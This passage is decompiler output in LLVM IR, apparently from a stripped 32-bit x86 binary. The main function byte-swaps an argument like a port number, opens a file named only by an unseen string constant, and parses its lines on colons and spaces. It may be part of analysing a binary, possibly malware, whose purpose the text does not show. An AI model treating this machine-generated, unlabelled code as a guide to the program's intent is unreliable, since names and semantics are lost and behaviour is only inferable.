  %v0_804d59e = phi i32 [ %v2_804d595, %dec_label_pc_804d59e.loopexit ], [ %v2_804d586, %dec_label_pc_804d548 ]
  %v1_804d59e = urem i32 %v0_804d59e, 65536
  %v1_804d5a2 = xor i32 %v1_804d59e, 65535
  ret i32 %v1_804d5a2

dec_label_pc_804d5ac:                             ; preds = %dec_label_pc_804d545
  %v1_804d5ae = inttoptr i32 %v0_804d5ae to i8*
  %v2_804d5ae = load i8, i8* %v1_804d5ae, align 1
  %v3_804d5ae = zext i8 %v2_804d5ae to i32
  %v2_804d5b0 = add i32 %v3_804d5ae, %v0_804d5b0
  br label %dec_label_pc_804d548

; uselistorder directives
  uselistorder i32 %v2_804d595, { 2, 1, 3, 0 }
  uselistorder i32 %v2_804d586, { 3, 0, 2, 1 }
  uselistorder i32 %v1_804d540, { 1, 0 }
  uselistorder i32 %v1_804d533, { 0, 2, 1 }
  uselistorder i32 %v3_804d521, { 1, 0 }
  uselistorder i32 %v4_804d515, { 1, 0 }
  uselistorder i32 %tmp17, { 0, 2, 1 }
  uselistorder i32 %tmp16, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d590, { 1, 0 }
  uselistorder label %dec_label_pc_804d548, { 1, 0 }
  uselistorder label %dec_label_pc_804d530, { 1, 0 }
}

define i32 @function_804d5e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804d5e0:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp47 = call i8 @__decompiler_undefined_function_3()
  %tmp51 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-48 = alloca i8, align 1
  %stack_var_-4657 = alloca i32, align 4
  %stack_var_-8753 = alloca i32, align 4
  %stack_var_-8796 = alloca i8*, align 4
  %stack_var_-561 = alloca i8, align 1
  %stack_var_-8780 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d5e0 = load i32, i32* @ebp, align 4
  %v0_804d5e1 = load i32, i32* @edi, align 4
  %v0_804d5e2 = load i32, i32* @esi, align 4
  %v0_804d5e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d5e3, i32* %stack_var_-16, align 4
  %v15_804d5e4 = ptrtoint i32* %stack_var_-8780 to i32
  %v2_804d5ea = ptrtoint i8* %stack_var_-561 to i32
  store i32 %v2_804d5ea, i32* @edi, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v5_804d62d = call i32 @function_805271a(i8* nonnull %stack_var_-561, i32 0, i32 513)
  %v1_804d635 = trunc i32 %arg1 to i16
  %v2_804d635 = call i16 @llvm.bswap.i16(i16 %v1_804d635)
  %v3_804d635 = zext i16 %v2_804d635 to i32
  %v2_804d640 = ptrtoint i32* %stack_var_-8753 to i32
  store i32 %v2_804d640, i32* %eax.global-to-local, align 4
  store i32 %v3_804d635, i32* @ebx, align 4
  %tmp71 = bitcast i32* %stack_var_-8753 to i8*
  store i8* %tmp71, i8** %stack_var_-8796, align 4
  %v5_804d64b = call i32 @function_805271a(i8* %tmp71, i32 0, i32 4096)
  store i32 %v5_804d64b, i32* %eax.global-to-local, align 4
  %v2_804d65a = ptrtoint i32* %stack_var_-4657 to i32
  store i32 %v2_804d65a, i32* %edx.global-to-local, align 4
  %tmp72 = bitcast i32* %stack_var_-4657 to i8*
  store i8* %tmp72, i8** %stack_var_-8796, align 4
  %v5_804d662 = call i32 @function_805271a(i8* %tmp72, i32 0, i32 4096)
  %v2_804d66a = ptrtoint i8* %stack_var_-48 to i32
  store i32 %v2_804d66a, i32* %eax.global-to-local, align 4
  %v0_804d674 = load i32, i32* @ebx, align 4
  %v5_804d674 = inttoptr i32 %v0_804d674 to i8*
  store i8* %v5_804d674, i8** %stack_var_-8796, align 4
  %v4_804d675 = sext i32 %v0_804d674 to i64
  %v5_804d675 = call i32 @function_8052000(i64 %v4_804d675, i32 16, i32 %v2_804d66a)
  store i32 %v5_804d675, i32* %eax.global-to-local, align 4
  store i32 %v2_804d66a, i32* %edx.global-to-local, align 4
  store i8* %stack_var_-48, i8** %stack_var_-8796, align 4
  %v3_804d683 = call i32 @function_8051bf0(i8* nonnull %stack_var_-48)
  store i32 %v3_804d683, i32* %eax.global-to-local, align 4
  %v9_804d68b = icmp eq i32 %v3_804d683, 2
  br i1 %v9_804d68b, label %dec_label_pc_804dbb5, label %dec_label_pc_804d694

dec_label_pc_804d694:                             ; preds = %dec_label_pc_804d5e0, %dec_label_pc_804dbb5
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d69b = call i32 @function_80512a0(i8 6)
  store i32 %v3_804d69b, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d6a7 = call i32 @function_80512a0(i8 7)
  store i32 %v3_804d6a7, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d6b3 = call i32 @function_80512a0(i8 9)
  %v2_804d6b8 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804d6b8 = ptrtoint i8* %v2_804d6b8 to i32
  store i32 %v3_804d6b8, i32* %eax.global-to-local, align 4
  store i32 16, i32* %edx.global-to-local, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054af0.20, i32 0, i32 0), i8** %stack_var_-8796, align 4
  %v4_804d6c1 = call i32 @function_80522a2(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_8054af0.20, i32 0, i32 0), i32 0)
  store i32 %v4_804d6c1, i32* @eax, align 4
  store i32 %v4_804d6c1, i32* @ebp, align 4
  %v10_804d6cb = icmp eq i32 %v4_804d6c1, -1
  br i1 %v10_804d6cb, label %dec_label_pc_804db4e, label %dec_label_pc_804d6d4.outer.preheader

dec_label_pc_804d6d4.outer.preheader:             ; preds = %dec_label_pc_804d694
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc9095 = call i32 @function_8051e10(i32 %v2_804d5ea, i32 512, i32 %v4_804d6c1)
  store i32 %v4_804d6dc9095, i32* %eax.global-to-local, align 4
  %v1_804d6e49196 = icmp eq i32 %v4_804d6dc9095, 0
  br i1 %v1_804d6e49196, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec.lr.ph.lr.ph

dec_label_pc_804d6ec.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804d6d4.outer.preheader
  %v2_804d718 = add i32 %v15_804d5e4, 8221
  %v2_804d744 = add i32 %v15_804d5e4, 8219
  br label %dec_label_pc_804d6ec.lr.ph

dec_label_pc_804d6ec:                             ; preds = %dec_label_pc_804d6ec.lr.ph, %dec_label_pc_804d6d4.backedge
  %v4_804d6dc92 = phi i32 [ %v4_804d6dc9098, %dec_label_pc_804d6ec.lr.ph ], [ %v4_804d6dc, %dec_label_pc_804d6d4.backedge ]
  %v3_804d6ec = load i8, i8* %stack_var_-561, align 1
  %v4_804d6ec = sext i8 %v3_804d6ec to i32
  %v7_804d6ec = and i32 %v4_804d6dc92, -256
  %v8_804d6ec = or i32 %v4_804d6ec, %v7_804d6ec
  store i32 %v8_804d6ec, i32* @eax, align 4
  %v4_804d6f3 = icmp eq i8 %v3_804d6ec, 0
  br i1 %v4_804d6f3, label %dec_label_pc_804db17, label %dec_label_pc_804d6fb

dec_label_pc_804d6fb:                             ; preds = %dec_label_pc_804d6ec
  store i32 0, i32* %edx.global-to-local, align 4
  %v10_804d6fd = icmp eq i8 %v3_804d6ec, 58
  br i1 %v10_804d6fd, label %dec_label_pc_804db17, label %dec_label_pc_804d705.preheader

dec_label_pc_804d705.preheader:                   ; preds = %dec_label_pc_804d6fb
  %v1_804d706.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d705

dec_label_pc_804d705:                             ; preds = %dec_label_pc_804d705.preheader, %dec_label_pc_804d70d
  %v6_804d706 = phi i32 [ %v8_804d6ec, %dec_label_pc_804d705.preheader ], [ %v8_804d706, %dec_label_pc_804d70d ]
  %v0_804d705 = phi i32 [ 0, %dec_label_pc_804d705.preheader ], [ %v1_804d705, %dec_label_pc_804d70d ]
  %v1_804d705 = add i32 %v0_804d705, 1
  store i32 %v1_804d705, i32* %edx.global-to-local, align 4
  %v2_804d706 = add i32 %v1_804d705, %v1_804d706.pre
  %v3_804d706 = inttoptr i32 %v2_804d706 to i8*
  %v4_804d706 = load i8, i8* %v3_804d706, align 1
  %v5_804d706 = zext i8 %v4_804d706 to i32
  %v7_804d706 = and i32 %v6_804d706, -256
  %v8_804d706 = or i32 %v5_804d706, %v7_804d706
  store i32 %v8_804d706, i32* @eax, align 4
  %v4_804d709 = icmp eq i8 %v4_804d706, 0
  br i1 %v4_804d709, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d70d

dec_label_pc_804d70d:                             ; preds = %dec_label_pc_804d705
  %v10_804d70d = icmp eq i8 %v4_804d706, 58
  %v1_804d70f = icmp eq i1 %v10_804d70d, false
  br i1 %v1_804d70f, label %dec_label_pc_804d705, label %dec_label_pc_804d711

dec_label_pc_804d711:                             ; preds = %dec_label_pc_804d70d, %dec_label_pc_804db17
  %v1_804d72f = phi i32 [ 0, %dec_label_pc_804db17 ], [ %v1_804d705, %dec_label_pc_804d70d ]
  %v7_804d718 = phi i32 [ %v8_804d6ec, %dec_label_pc_804db17 ], [ %v8_804d706, %dec_label_pc_804d70d ]
  %v3_804d711 = trunc i32 %v7_804d718 to i8
  %v4_804d711 = icmp eq i8 %v3_804d711, 0
  br i1 %v4_804d711, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d715

dec_label_pc_804d6d4.backedge:                    ; preds = %dec_label_pc_804d705, %dec_label_pc_804d711, %dec_label_pc_804d744
  %v0_804d6d4.be = phi i32 [ %v7_804d718, %dec_label_pc_804d711 ], [ 0, %dec_label_pc_804d744 ], [ %v8_804d706, %dec_label_pc_804d705 ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc = call i32 @function_8051e10(i32 %v2_804d5ea, i32 512, i32 %v0_804d6d4.be)
  store i32 %v4_804d6dc, i32* %eax.global-to-local, align 4
  %v1_804d6e4 = icmp eq i32 %v4_804d6dc, 0
  br i1 %v1_804d6e4, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec

dec_label_pc_804d715:                             ; preds = %dec_label_pc_804d711
  %v1_804d715 = add i32 %v1_804d72f, 2
  store i32 %v1_804d715, i32* @ecx, align 4
  %v3_804d718 = add i32 %v2_804d718, %v1_804d72f
  %v4_804d718 = inttoptr i32 %v3_804d718 to i8*
  %v5_804d718 = load i8, i8* %v4_804d718, align 1
  %v6_804d718 = zext i8 %v5_804d718 to i32
  %v8_804d718 = and i32 %v7_804d718, -256
  %v9_804d718 = or i32 %v6_804d718, %v8_804d718
  store i32 %v9_804d718, i32* %eax.global-to-local, align 4
  %v4_804d71f = icmp eq i8 %v5_804d718, 0
  br i1 %v4_804d71f, label %dec_label_pc_804d744, label %dec_label_pc_804d727

dec_label_pc_804d727:                             ; preds = %dec_label_pc_804d715
  %v7_804d727 = icmp eq i8 %v5_804d718, 32
  br i1 %v7_804d727, label %dec_label_pc_804d744, label %dec_label_pc_804d72f

dec_label_pc_804d72f:                             ; preds = %dec_label_pc_804d727
  %v0_804d72f = load i32, i32* @edi, align 4
  %v2_804d72f = add i32 %v0_804d72f, %v1_804d72f
  store i32 %v2_804d72f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d732

dec_label_pc_804d732:                             ; preds = %dec_label_pc_804d73a, %dec_label_pc_804d72f
  %v5_804d732 = phi i32 [ %v7_804d732, %dec_label_pc_804d73a ], [ %v1_804d72f, %dec_label_pc_804d72f ]
  %v0_804d735 = phi i32 [ %v1_804d735, %dec_label_pc_804d73a ], [ %v2_804d72f, %dec_label_pc_804d72f ]
  %v1_804d732 = add i32 %v0_804d735, 3
  %v2_804d732 = inttoptr i32 %v1_804d732 to i8*
  %v3_804d732 = load i8, i8* %v2_804d732, align 1
  %v4_804d732 = zext i8 %v3_804d732 to i32
  %v6_804d732 = and i32 %v5_804d732, -256
  %v7_804d732 = or i32 %v4_804d732, %v6_804d732
  store i32 %v7_804d732, i32* %edx.global-to-local, align 4
  %v1_804d735 = add i32 %v0_804d735, 1
  store i32 %v1_804d735, i32* %eax.global-to-local, align 4
  %v4_804d736 = icmp eq i8 %v3_804d732, 0
  br i1 %v4_804d736, label %dec_label_pc_804d73f, label %dec_label_pc_804d73a

dec_label_pc_804d73a:                             ; preds = %dec_label_pc_804d732
  %v7_804d73a = icmp eq i8 %v3_804d732, 32
  %v1_804d73d = icmp eq i1 %v7_804d73a, false
  br i1 %v1_804d73d, label %dec_label_pc_804d732, label %dec_label_pc_804d73f

dec_label_pc_804d73f:                             ; preds = %dec_label_pc_804d73a, %dec_label_pc_804d732
  %v2_804d73f = sub i32 %v1_804d735, %v0_804d72f
  store i32 %v2_804d73f, i32* %eax.global-to-local, align 4
  %v1_804d741 = add i32 %v2_804d73f, 2
  br label %dec_label_pc_804d744

dec_label_pc_804d744:                             ; preds = %dec_label_pc_804d715, %dec_label_pc_804d727, %dec_label_pc_804d73f
  %storemerge = phi i32 [ %v1_804d741, %dec_label_pc_804d73f ], [ %v1_804d715, %dec_label_pc_804d727 ], [ %v1_804d715, %dec_label_pc_804d715 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804d744 = add i32 %v2_804d744, %storemerge
  %v4_804d744 = inttoptr i32 %v3_804d744 to i8*
  store i8 0, i8* %v4_804d744, align 1
  %v0_804d74f = load i32, i32* @edi, align 4
  %v1_804d74f = load i32, i32* @ecx, align 4
  %v2_804d74f = add i32 %v1_804d74f, %v0_804d74f
  store i32 %v2_804d74f, i32* @ebx, align 4
  %v5_804d752 = inttoptr i32 %v2_804d74f to i8*
  store i8* %v5_804d752, i8** %stack_var_-8796, align 4
  %v3_804d753 = call i32 @function_8051bf0(i8* %v5_804d752)
  store i32 %v3_804d753, i32* %eax.global-to-local, align 4
  store i32 %v2_804d66a, i32* @edx, align 4
  %v0_804d764 = load i32, i32* @ebx, align 4
  %v5_804d764 = inttoptr i32 %v0_804d764 to i8*
  store i8* %v5_804d764, i8** %stack_var_-8796, align 4
  %v5_804d765 = call i32 @function_8051ee0(i8* %v5_804d764, i32 %v3_804d753, i32 %v2_804d66a)
  %v1_804d76d = add i32 %v5_804d765, 1
  %v8_804d76d = icmp eq i32 %v1_804d76d, 0
  store i32 %v1_804d76d, i32* @eax, align 4
  br i1 %v8_804d76d, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d774

dec_label_pc_804d774:                             ; preds = %dec_label_pc_804d744
  %v0_804d774 = load i32, i32* @esi, align 4
  %v1_804d774 = add i32 %v0_804d774, 1
  %v0_804d777 = load i32, i32* @edi, align 4
  %v2_804d777 = add i32 %v0_804d777, %v0_804d774
  store i32 %v2_804d777, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804d783.outer

dec_label_pc_804d783.outer:                       ; preds = %dec_label_pc_804db02, %dec_label_pc_804d774
  %v0_804daf830 = phi i32 [ %v1_804daf8, %dec_label_pc_804db02 ], [ 0, %dec_label_pc_804d774 ]
  %v0_804d78625 = phi i32 [ %v1_804d786, %dec_label_pc_804db02 ], [ %v1_804d774, %dec_label_pc_804d774 ]
  %v5_804d78324 = phi i32 [ %v7_804d783, %dec_label_pc_804db02 ], [ %v1_804d76d, %dec_label_pc_804d774 ]
  %v0_804d78322 = phi i32 [ %v1_804db08, %dec_label_pc_804db02 ], [ %v2_804d777, %dec_label_pc_804d774 ]
  %stack_var_-8769.1.ph = phi i8 [ %.stack_var_-8769.1, %dec_label_pc_804db02 ], [ 0, %dec_label_pc_804d774 ]
  br label %dec_label_pc_804d783

dec_label_pc_804d783:                             ; preds = %dec_label_pc_804d783.outer, %dec_label_pc_804d7a5
  %v0_804daf8 = phi i32 [ %v0_804daf830, %dec_label_pc_804d783.outer ], [ %v0_804d7a6, %dec_label_pc_804d7a5 ]
  %v0_804db10 = phi i32 [ 0, %dec_label_pc_804d783.outer ], [ %storemerge4, %dec_label_pc_804d7a5 ]
  %v0_804d786 = phi i32 [ %v0_804d78625, %dec_label_pc_804d783.outer ], [ %v1_804d786, %dec_label_pc_804d7a5 ]
  %v5_804d783 = phi i32 [ %v5_804d78324, %dec_label_pc_804d783.outer ], [ %v7_804d783, %dec_label_pc_804d7a5 ]
  %v0_804d7a5 = phi i32 [ %v0_804d78322, %dec_label_pc_804d783.outer ], [ %v1_804d7a5, %dec_label_pc_804d7a5 ]
  %v1_804d783 = add i32 %v0_804d7a5, 2
  %v2_804d783 = inttoptr i32 %v1_804d783 to i8*
  %v3_804d783 = load i8, i8* %v2_804d783, align 1
  %v4_804d783 = zext i8 %v3_804d783 to i32
  %v6_804d783 = and i32 %v5_804d783, -256
  %v7_804d783 = or i32 %v4_804d783, %v6_804d783
  store i32 %v7_804d783, i32* @eax, align 4
  %v1_804d786 = add i32 %v0_804d786, 1
  %v4_804d787 = icmp eq i8 %v3_804d783, 0
  br i1 %v4_804d787, label %dec_label_pc_804d7ab, label %dec_label_pc_804d78b

dec_label_pc_804d78b:                             ; preds = %dec_label_pc_804d783
  %v7_804d78b = icmp eq i8 %v3_804d783, 32
  br i1 %v7_804d78b, label %dec_label_pc_804db10, label %dec_label_pc_804d793

dec_label_pc_804d793:                             ; preds = %dec_label_pc_804d78b
  %v10_804d793 = icmp eq i8 %v3_804d783, 9
  br i1 %v10_804d793, label %dec_label_pc_804db10, label %dec_label_pc_804d79b

dec_label_pc_804d79b:                             ; preds = %dec_label_pc_804d793
  %v1_804d79b = trunc i32 %v0_804db10 to i8
  %v9_804d79b = icmp eq i8 %v1_804d79b, 1
  br i1 %v9_804d79b, label %dec_label_pc_804daf8, label %dec_label_pc_804d7a3

dec_label_pc_804d7a3:                             ; preds = %dec_label_pc_804daf8, %dec_label_pc_804d79b
  %v0_804d7a631 = phi i32 [ %v1_804daf8, %dec_label_pc_804daf8 ], [ %v0_804daf8, %dec_label_pc_804d79b ]
  br label %dec_label_pc_804d7a5

dec_label_pc_804d7a5:                             ; preds = %dec_label_pc_804db10, %dec_label_pc_804d7a3
  %v0_804d7a6 = phi i32 [ %v0_804d7a631, %dec_label_pc_804d7a3 ], [ %v0_804daf8, %dec_label_pc_804db10 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_804d7a3 ], [ %v2_804db10, %dec_label_pc_804db10 ]
  store i32 %storemerge4, i32* @ebx, align 4
  %v1_804d7a5 = add i32 %v0_804d7a5, 1
  store i32 %v1_804d7a5, i32* %edx.global-to-local, align 4
  %v7_804d7a9 = icmp sgt i32 %v0_804d7a6, 6
  br i1 %v7_804d7a9, label %dec_label_pc_804d7ab, label %dec_label_pc_804d783

dec_label_pc_804d7ab:                             ; preds = %dec_label_pc_804d7a5, %dec_label_pc_804d783
  %v5_804d7ca35 = phi i32 [ %storemerge4, %dec_label_pc_804d7a5 ], [ %v0_804db10, %dec_label_pc_804d783 ]
  store i32 %v1_804d786, i32* %edx.global-to-local, align 4
  %v4_804d7ad = icmp eq i8 %stack_var_-8769.1.ph, 0
  br i1 %v4_804d7ad, label %dec_label_pc_804d6d4.outer.backedge, label %dec_label_pc_804d7b8

dec_label_pc_804d6d4.outer.backedge:              ; preds = %dec_label_pc_804d7ab, %dec_label_pc_804d7d8
  %v0_804d6d48.be = phi i32 [ %v3_804d7e7, %dec_label_pc_804d7d8 ], [ %v7_804d783, %dec_label_pc_804d7ab ]
  %stack_var_-8769.0.ph.be = phi i8 [ %stack_var_-8769.1.ph, %dec_label_pc_804d7d8 ], [ 0, %dec_label_pc_804d7ab ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc90 = call i32 @function_8051e10(i32 %v2_804d5ea, i32 512, i32 %v0_804d6d48.be)
  store i32 %v4_804d6dc90, i32* %eax.global-to-local, align 4
  %v1_804d6e491 = icmp eq i32 %v4_804d6dc90, 0
  br i1 %v1_804d6e491, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec.lr.ph

dec_label_pc_804d6ec.lr.ph:                       ; preds = %dec_label_pc_804d6ec.lr.ph.lr.ph, %dec_label_pc_804d6d4.outer.backedge
  %v4_804d6dc9098 = phi i32 [ %v4_804d6dc9095, %dec_label_pc_804d6ec.lr.ph.lr.ph ], [ %v4_804d6dc90, %dec_label_pc_804d6d4.outer.backedge ]
  %stack_var_-8769.0.ph97 = phi i8 [ %tmp51, %dec_label_pc_804d6ec.lr.ph.lr.ph ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d6d4.outer.backedge ]
  br label %dec_label_pc_804d6ec

dec_label_pc_804d7b8:                             ; preds = %dec_label_pc_804d7ab
  %v3_804d7b8 = add i32 %v1_804d786, %v2_804d744
  %v4_804d7b8 = inttoptr i32 %v3_804d7b8 to i8*
  %v5_804d7b8 = load i8, i8* %v4_804d7b8, align 1
  %v6_804d7b8 = zext i8 %v5_804d7b8 to i32
  %v9_804d7b8 = or i32 %v6_804d7b8, %v6_804d783
  store i32 %v9_804d7b8, i32* %eax.global-to-local, align 4
  %v4_804d7bf = icmp eq i8 %v5_804d7b8, 0
  br i1 %v4_804d7bf, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7c3

dec_label_pc_804d7c3:                             ; preds = %dec_label_pc_804d7b8
  %v7_804d7c3 = icmp eq i8 %v5_804d7b8, 32
  br i1 %v7_804d7c3, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7c7

dec_label_pc_804d7c7:                             ; preds = %dec_label_pc_804d7c3
  %v2_804d7c7 = add i32 %v1_804d786, %v0_804d777
  store i32 %v2_804d7c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7ca

dec_label_pc_804d7ca:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7c7
  %v0_804d7cd = phi i32 [ %v1_804d7cd, %dec_label_pc_804d7d3 ], [ %v1_804d786, %dec_label_pc_804d7c7 ]
  %v5_804d7ca = phi i32 [ %v7_804d7ca, %dec_label_pc_804d7d3 ], [ %v5_804d7ca35, %dec_label_pc_804d7c7 ]
  %v0_804d7ce = phi i32 [ %v1_804d7ca, %dec_label_pc_804d7d3 ], [ %v2_804d7c7, %dec_label_pc_804d7c7 ]
  %v1_804d7ca = add i32 %v0_804d7ce, 1
  %v2_804d7ca = inttoptr i32 %v1_804d7ca to i8*
  %v3_804d7ca = load i8, i8* %v2_804d7ca, align 1
  %v1_804d7cd = add i32 %v0_804d7cd, 1
  store i32 %v1_804d7ca, i32* %eax.global-to-local, align 4
  %v4_804d7cf = icmp eq i8 %v3_804d7ca, 0
  br i1 %v4_804d7cf, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7d3

dec_label_pc_804d7d3:                             ; preds = %dec_label_pc_804d7ca
  %v4_804d7ca = zext i8 %v3_804d7ca to i32
  %v6_804d7ca = and i32 %v5_804d7ca, -256
  %v7_804d7ca = or i32 %v4_804d7ca, %v6_804d7ca
  %v7_804d7d3 = icmp eq i8 %v3_804d7ca, 32
  %v1_804d7d6 = icmp eq i1 %v7_804d7d3, false
  br i1 %v1_804d7d6, label %dec_label_pc_804d7ca, label %dec_label_pc_804d7d8

dec_label_pc_804d7d8:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7ca, %dec_label_pc_804d7c3, %dec_label_pc_804d7b8
  %v1_804d7d8 = phi i32 [ %v1_804d786, %dec_label_pc_804d7c3 ], [ %v1_804d786, %dec_label_pc_804d7b8 ], [ %v1_804d7cd, %dec_label_pc_804d7ca ], [ %v1_804d7cd, %dec_label_pc_804d7d3 ]
  %v3_804d7d8 = add i32 %v1_804d7d8, %v2_804d744
  %v4_804d7d8 = inttoptr i32 %v3_804d7d8 to i8*
  store i8 0, i8* %v4_804d7d8, align 1
  %v0_804d7e3 = load i32, i32* @edi, align 4
  %v1_804d7e3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d7e3 = add i32 %v1_804d7e3, %v0_804d7e3
  store i32 %v2_804d7e3, i32* @ebx, align 4
  %v5_804d7e6 = inttoptr i32 %v2_804d7e3 to i8*
  store i8* %v5_804d7e6, i8** %stack_var_-8796, align 4
  %v3_804d7e7 = call i32 @function_8051bf0(i8* %v5_804d7e6)
  store i32 %v3_804d7e7, i32* @eax, align 4
  %v1_804d7ef = add i32 %v3_804d7e7, -15
  %v6_804d7ef = sub i32 14, %v3_804d7e7
  %v7_804d7ef = and i32 %v6_804d7ef, %v3_804d7e7
  %v8_804d7ef = icmp slt i32 %v7_804d7ef, 0
  %v9_804d7ef = icmp eq i32 %v1_804d7ef, 0
  %v10_804d7ef = icmp slt i32 %v1_804d7ef, 0
  %v3_804d7f2 = icmp eq i1 %v10_804d7ef, %v8_804d7ef
  %v4_804d7f2 = icmp eq i1 %v9_804d7ef, false
  %v5_804d7f2 = and i1 %v4_804d7f2, %v3_804d7f2
  br i1 %v5_804d7f2, label %dec_label_pc_804d6d4.outer.backedge, label %dec_label_pc_804d7f8

dec_label_pc_804d7f8:                             ; preds = %dec_label_pc_804d7d8
  %v0_804d7fa = load i32, i32* @ebx, align 4
  %v2_804d7fb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d7fb, i32* %eax.global-to-local, align 4
  %tmp73 = bitcast i32* %stack_var_-32 to i8*
  store i8* %tmp73, i8** %stack_var_-8796, align 4
  %v4_804d803 = call i32 @function_8051c10(i8* %tmp73, i32 %v0_804d7fa)
  store i32 %v4_804d803, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d80b

dec_label_pc_804d80b.loopexit:                    ; preds = %dec_label_pc_804d6d4.backedge, %dec_label_pc_804d6d4.outer.preheader, %dec_label_pc_804d6d4.outer.backedge
  %stack_var_-8769.0.ph.lcssa = phi i8 [ %tmp51, %dec_label_pc_804d6d4.outer.preheader ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d6d4.outer.backedge ], [ %stack_var_-8769.0.ph97, %dec_label_pc_804d6d4.backedge ]
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  %.pre46 = bitcast i32* %stack_var_-32 to i8*
  br label %dec_label_pc_804d80b

dec_label_pc_804d80b:                             ; preds = %dec_label_pc_804d80b.loopexit, %dec_label_pc_804d7f8
  %.pre-phi = phi i8* [ %.pre46, %dec_label_pc_804d80b.loopexit ], [ %tmp73, %dec_label_pc_804d7f8 ]
  %v2_804d815.pre-phi = phi i32 [ %.pre, %dec_label_pc_804d80b.loopexit ], [ %v2_804d7fb, %dec_label_pc_804d7f8 ]
  %stack_var_-8769.2 = phi i8 [ %stack_var_-8769.0.ph.lcssa, %dec_label_pc_804d80b.loopexit ], [ %stack_var_-8769.1.ph, %dec_label_pc_804d7f8 ]
  %v0_804d80e = load i32, i32* @ebp, align 4
  %v5_804d80e = inttoptr i32 %v0_804d80e to i8*
  store i8* %v5_804d80e, i8** %stack_var_-8796, align 4
  %v2_804d80f = call i32 @function_8052191(i32 %v0_804d80e)
  %v2_804d814 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804d814 = ptrtoint i8* %v2_804d814 to i32
  store i32 %v3_804d814, i32* %eax.global-to-local, align 4
  store i32 %v2_804d815.pre-phi, i32* %edx.global-to-local, align 4
  store i8* %.pre-phi, i8** %stack_var_-8796, align 4
  %v3_804d81d = call i32 @function_8051bf0(i8* %.pre-phi)
  store i32 %v3_804d81d, i32* %eax.global-to-local, align 4
  %v1_804d825 = icmp eq i32 %v3_804d81d, 0
  br i1 %v1_804d825, label %dec_label_pc_804db27, label %dec_label_pc_804d82d

dec_label_pc_804d82d:                             ; preds = %dec_label_pc_804d80b
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v4_804d833 = call i32 @function_80511f0(i32 6, i32* null)
  store i32 %v4_804d833, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v4_804d83a = inttoptr i32 %v4_804d833 to i8*
  store i8* %v4_804d83a, i8** %stack_var_-8796, align 4
  %v2_804d83d = call i32 @function_8052554(i32 %v4_804d833)
  store i32 %v2_804d83d, i32* %eax.global-to-local, align 4
  store i32 %v2_804d83d, i32* %stack_var_-8780, align 4
  %v1_804d849 = icmp eq i32 %v2_804d83d, 0
  br i1 %v1_804d849, label %dec_label_pc_804db77, label %dec_label_pc_804d859

dec_label_pc_804d859:                             ; preds = %dec_label_pc_804d918, %dec_label_pc_804d88a, %dec_label_pc_804d87d, %dec_label_pc_804dbee, %dec_label_pc_804d82d
  %v0_804d859 = phi i32 [ %v15_804d5e4, %dec_label_pc_804d82d ], [ %v1_804dbf7, %dec_label_pc_804dbee ], [ %v1_804d866, %dec_label_pc_804d87d ], [ %v1_804d90e, %dec_label_pc_804d88a ], [ %v1_804d990, %dec_label_pc_804d918 ]
  %v2_804d85c = inttoptr i32 %v0_804d859 to i32*
  %v3_804d85c = load i32, i32* %v2_804d85c, align 4
  store i32 %v3_804d85c, i32* @ebx, align 4
  %v2_804d860 = add i32 %v0_804d859, -16
  %v3_804d860 = inttoptr i32 %v2_804d860 to i32*
  store i32 %v3_804d85c, i32* %v3_804d860, align 4
  %v0_804d861 = call i32 @function_8052645()
  store i32 %v0_804d861, i32* @eax, align 4
  %v0_804d866 = load i32, i32* @esp, align 4
  %v1_804d866 = add i32 %v0_804d866, 16
  %v1_804d869 = icmp eq i32 %v0_804d861, 0
  br i1 %v1_804d869, label %dec_label_pc_804db62, label %dec_label_pc_804d871

